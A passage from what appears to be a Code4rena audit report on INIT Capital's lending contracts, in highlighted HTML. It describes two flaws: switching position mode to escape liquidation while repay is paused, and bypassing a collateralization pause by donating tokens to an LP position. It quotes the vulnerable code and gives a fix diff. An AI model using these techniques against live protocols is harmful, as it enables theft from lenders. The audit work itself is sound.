class=\"mtk12\">shares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">toInt256</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update position mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updatePosMode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">SetPositionMode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</details>\n<p>As mentioned before, if users see his position’s health status is about to reach liquidation threshold and change the mode, this will allow users to prevent their positions from getting liquidated, as both <code>liquidate</code> and <code>liquidateWLp</code> will check the <code>canRepay</code> flag and revert if it’s not allowed.</p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L282-L314\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L282-L314</a><br>\n<a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L317-L353\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L317-L353</a><br>\n<a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L587-L599\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L587-L599</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @dev liquidation internal logic</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_liquidateInternal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_poolToRepay</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_repayShares</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">LiquidateLocalVars</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">config</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IConfig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">config</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mode</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getPosMode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check position must be unhealthy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">health_e18</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getPosHealthCurrent_e18</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">health_e18</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">ONE_E18</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">POSITION_HEALTHY</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;     (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">repayToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">repayAmt</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">config</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_poolToRepay</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_repayShares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L530-L551\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L530-L551</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IConfig</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenToRepay</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;     </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPoolConfig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">canRepay</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getModeStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">).</span><span class=\"mtk12\">canRepay</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">REPAY_PAUSED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get position debt share</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positionDebtShares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getPosDebtShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sharesToRepay</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">positionDebtShares</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">positionDebtShares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get amtToRepay (accrue interest)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtToRepay</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">debtShareToAmtCurrent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sharesToRepay</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// take token from msg.sender to pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenToRepay</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">underlyingToken</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenToRepay</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amtToRepay</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update debt on the position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updatePosDebtShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, -</span><span class=\"mtk12\">sharesToRepay</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt256</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// call repay on the pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sharesToRepay</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update debt on mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IRiskManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">riskManager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateModeDebtShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, -</span><span class=\"mtk12\">sharesToRepay</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt256</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a <code>canRepay</code> check status inside <code>setPosMode</code>; if it is paused, revert the change. Besides that, the <code>canRepay</code> and <code>canBorrow</code> checks don’t need to be inside the pools check loop.</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function setPosMode(uint _posId, uint16 _mode)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        onlyAuthorized(_posId)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ensurePositionHealth(_posId)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        nonReentrant</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        IConfig _config = IConfig(config);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // get current collaterals in the position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (address[] memory pools,, address[] memory wLps, uint[][] memory ids,) =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            IPosManager(POS_MANAGER).getPosCollInfo(_posId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint16 currentMode = _getPosMode(_posId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ModeStatus memory currentModeStatus = _config.getModeStatus(currentMode);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ModeStatus memory newModeStatus = _config.getModeStatus(_mode);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (pools.length != 0 || wLps.length != 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _require(newModeStatus.canCollateralize, Errors.COLLATERALIZE_PAUSED);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _require(currentModeStatus.canDecollateralize, Errors.DECOLLATERALIZE_PAUSED);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // check that each position collateral belongs to the _mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        for (uint i; i &lt; pools.length; i = i.uinc()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _require(_config.isAllowedForCollateral(_mode, pools[i]), Errors.INVALID_MODE);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        for (uint i; i &lt; wLps.length; i = i.uinc()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            for (uint j; j &lt; ids[i].length; j = j.uinc()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                _require(_config.isAllowedForCollateral(_mode, IBaseWrapLp(wLps[i]).lp(ids[i][j])), Errors.INVALID_MODE);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // get current debts in the position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint[] memory shares;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (pools, shares) = IPosManager(POS_MANAGER).getPosBorrInfo(_posId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        IRiskManager _riskManager = IRiskManager(riskManager);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // check that each position debt belongs to the _mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _require(newModeStatus.canBorrow, Errors.BORROW_PAUSED);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _require(currentModeStatus.canRepay, Errors.REPAY_PAUSED);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _require(newModeStatus.canRepay, Errors.REPAY_PAUSED);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        for (uint i; i &lt; pools.length; i = i.uinc()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _require(_config.isAllowedForBorrow(_mode, pools[i]), Errors.INVALID_MODE);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            _require(newModeStatus.canBorrow, Errors.BORROW_PAUSED);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            _require(currentModeStatus.canRepay, Errors.REPAY_PAUSED);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // update debt on current mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _riskManager.updateModeDebtShares(currentMode, pools[i], -shares[i].toInt256());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // update debt on new mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _riskManager.updateModeDebtShares(_mode, pools[i], shares[i].toInt256());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // update position mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        IPosManager(POS_MANAGER).updatePosMode(_posId, _mode);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        emit SetPositionMode(_posId, _mode);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</details>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/26#issuecomment-1870318447\">fez-init (INIT) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-05-collateralizewlp-can-be-bypassed-even-when-collateralization-is-paused\" style=\"position:relative;\"><a href=\"#m-05-collateralizewlp-can-be-bypassed-even-when-collateralization-is-paused\" aria-label=\"m 05 collateralizewlp can be bypassed even when collateralization is paused permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/25\">[M-05] <code>collateralizeWLp</code> can be bypassed even when collateralization is paused</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/25\">said</a></em></p>\n<p>Admin can pause collateralization for a specific mode to prevent users from providing more collateral either via <code>collateralize</code> or <code>collateralizeWLp</code>. However, due to not properly using internal accounting when tracking wLP collateral, users can still provide more collateral by directly donating tokens to a specific LP <code>tokenId</code>.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>It can be seen that when <code>canCollateralize</code> of certain mode is paused, <code>collateralizeWLp</code> should be paused.</p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L243-L261\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L243-L261</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @inheritdoc IInitCore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">collateralizeWLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">onlyAuthorized</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">nonReentrant</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IConfig</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_config</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IConfig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">config</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mode</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getPosMode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check mode status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;     </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getModeStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mode</span><span class=\"mtk1\">).</span><span class=\"mtk12\">canCollateralize</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">COLLATERALIZE_PAUSED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check if the wLp is whitelisted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">whitelistedWLps</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span 